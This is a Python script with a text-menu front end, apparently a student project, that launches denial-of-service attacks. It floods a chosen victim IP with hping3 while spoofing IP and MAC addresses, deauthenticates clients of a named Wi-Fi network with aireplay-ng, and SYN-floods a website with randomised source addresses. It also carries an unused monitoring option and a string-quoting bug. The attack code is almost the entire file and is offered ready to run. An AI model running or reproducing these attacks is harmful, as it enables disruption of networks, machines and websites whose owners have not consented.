#! /usr/bin/python

import os
import time
import signal
import commands


def a():



	def my(x,y):
		os.system("killall hping3 > /dev/null")
		os.system("ifconfig wlan0 up")
		os.system("pkill aireplay-ng > /dev/null")
		b()
	


	signal.signal(2,my)


	os.system("dialog --no-shadow --infobox 'Welcome to the DOS attacks & Monitoring Tools' 10 50")
	time.sleep(2)
	def b():
		os.system("dialog --no-shadow --title 'DOS Attack' --menu 'Select the desired option : ' 20 100 5 1 'DOS attack on any Machine.' 2 'DOS Attack on any Wireless Network.' 3 'DOS attack on any Website.' 4 'DOS Monitoring Tool.' 5 'Back' 2>  /root/Desktop/Project/choice.txt")
		f=open('/root/Desktop/Project/choice.txt','r')
		c=f.read()
		if c=='1':
			os.system("ifconfig | grep Bcast | awk '{print $2}' | cut -c 6-18 > /root/Desktop/Project/ip.txt")
			os.system("dialog --no-shadow --inputbox 'Enter victim(s) IP Address :' 10 40 2> /root/Desktop/Project/hello.txt")
			f=open('/root/Desktop/Project/hello.txt','r')
			x=f.read()
			f=open('/root/Desktop/Project/ip.txt','r')
			v=f.read()
			os.system("dialog --no-shadow --infobox 'DOS attack started. \nPress CTRL+C to stop.' 10 40")
			while True :
				i=2
				while i<252:
					p=str(i)
					os.system("ifconfig wlan0 192.168.1."+p)
					os.system("ifconfig wlan0 down")
					os.system("macchanger -r wlan0 > /dev/null")
					os.system("ifconfig wlan0 up")
					commands.getoutput("hping3 -i wlan0 --flood "+x+" > /dev/null")
					time.sleep(5)
					os.system("pkill hping3")
					i=i+1

		if c=='2':
			f=open('/root/Desktop/dump/wname','w')
			f.write("'")
			f.close()
			os.system("dialog --no-shadow --title 'DOS Wireless Network' --inputbox 'Enter Wireless Name : (Please be careful that you enter the exact same name.)' 10 80 2>> /root/Desktop/dump/wname")
			f=open('/root/Desktop/dump/wname','a')
			f.write("'")
			f.close()
			os.system("dialog --no-shadow --title 'Processing' --infobox 'Doing Operations.. Please Wait' 10 40")
			os.system("rm -r /root/Desktop/dump/report*")
			os.system("ifconfig wlan0 down")
			os.system("airmon-ng start wlan0 > /etc/null")
			os.system("gnome-terminal -x sh -c 'airodump-ng mon0 --write /root/Desktop/dump/report' ")
			time.sleep(5)
			os.system("pkill airodump-ng")
			f=open('/root/Desktop/dump/wname','r')
			l=f.read()
			os.system("cat /root/Desktop/dump/report-01.csv | grep "+l+" | awk '{ print $1 }' | sed 's/.$//' > /root/Desktop/dump/ssid")
			os.system("cat /root/Desktop/dump/report-01.csv | grep "+l+" | awk '{ print $6 }' | sed 's/.$//' > /root/Desktop/dump/ssidchannel")
			f=open('/root/Desktop/dump/ssid','r')
			k=f.read()
			f=open('/root/Desktop/dump/ssidchannel','r')
			k1=f.read()
			os.system('airodump-ng -c "+k1+" mon0')
			os.system('pkill airodump-ng')
			os.system("dialog --no-shadow --infobox 'DOS attack on WiFi started. \nPress CTRL+C to stop.' 10 40")
			#os.system("rm -f /root/Desktop/dump/report*")
			os.system("aireplay-ng -0 0 -a "+k+" -e "+l+" mon0")

		if c=='3':
			os.system("dialog --no-shadow --inputbox 'Enter Website(s) URL (Ex: www.jietjodhpur.com)' 10 50 2> /root/Desktop/dump/site")
			f=open('/root/Desktop/dump/site','r')
			site=f.read()
			os.system("dialog --no-shadow --infobox 'DOS attack started. \nPress CTRL+C to stop.' 10 40")
			while(1):
				l=commands.getoutput("hping3 -i wlan0 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source "+site+" > /dev/null")


		if c=='4':
			os.system("dialog --no-shadow --msgbox 'DOS Monitoring Started in Background' 10 40")
			os.system("nohup python dosprevent.py &")
			b()

		if c==5:
			exit()
	b()


